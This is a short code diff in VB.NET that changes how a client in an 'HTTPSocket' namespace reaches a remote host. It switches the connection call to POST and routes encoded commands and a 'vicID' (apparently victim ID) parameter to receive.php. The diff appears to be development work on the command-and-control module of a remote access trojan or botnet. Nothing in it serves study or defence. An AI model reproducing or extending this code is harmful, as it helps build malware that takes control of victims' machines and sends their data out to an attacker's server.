@@ -9,7 +9,7 @@ Namespace HTTPSocket
 
         Public Function Connect()
             Try
-                _GET("connection.php?data=" & ENB(ID & Y & Data))
+                _POST("connection.php", ENB(ID & Y & Data))
                 Return True
             Catch ex As Exception
                 Return False
@@ -73,8 +73,7 @@ Namespace HTTPSocket
         End Function
         Public Function Send(ByVal Command As String)
             Try
-                Dim Socket As New WebClient
-                Socket.DownloadString(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
+                _GET(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
                 Return True
             Catch ex As WebException
                 Return ex.Message
